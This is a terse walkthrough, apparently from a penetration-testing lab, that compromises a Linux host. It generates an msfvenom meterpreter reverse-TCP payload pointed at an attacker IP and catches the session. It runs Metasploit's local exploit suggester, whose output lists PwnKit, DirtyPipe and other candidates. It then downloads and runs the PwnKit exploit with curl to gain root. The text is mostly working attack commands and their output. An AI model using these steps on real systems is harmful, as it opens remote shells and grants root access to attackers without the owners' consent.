generate meterpreter payload

-  msfvenom \-p linux/x86/meterpreter/reverse\_tcp LHOST=192\.168\.45\.221 LPORT=4444 \-f elf \> \.\./shell\.elf
-  transfer shell\.elf to target machine

msf6\> run multi handler and get meterpreter session
msf6\> run post\(multi/recon/local\_exploit\_suggester\)

\[\+\] 192\.168\.201\.176 \- exploit/linux/local/cve\_2021\_4034\_pwnkit\_lpe\_pkexec: The target is vulnerable\.
\[\+\] 192\.168\.201\.176 \- exploit/linux/local/cve\_2022\_0847\_dirtypipe: The target appears to be vulnerable\. Linux kernel version found: 5\.8\.0
\[\+\] 192\.168\.201\.176 \- exploit/linux/local/pkexec: The service is running, but could not be validated\.
\[\+\] 192\.168\.201\.176 \- exploit/linux/local/runc\_cwd\_priv\_esc: The target appears to be vulnerable\. Vulnerable runc version runc: detected
\[\+\] 192\.168\.201\.176 \- exploit/linux/local/su\_login: The target appears to be vulnerable\.
\[\+\] 192\.168\.201\.176 \- exploit/linux/local/sudoedit\_bypass\_priv\_esc: The target appears to be vulnerable\. Sudo 1\.9\.1\.pre\.1ubuntu1\.1 is vulnerable, but unable to determine editable file\. OS can NOT be exploited by this module

Using PwnKit exploit

[https://github.com/ly4k/PwnKit?tab=readme-ov-file](#https://github.com/ly4k/PwnKit?tab=readme-ov-file)


curl \-fsSL [https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit](#https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit)
\-o PwnKit
chmod \+x \./PwnKit
\./PwnKit
# root

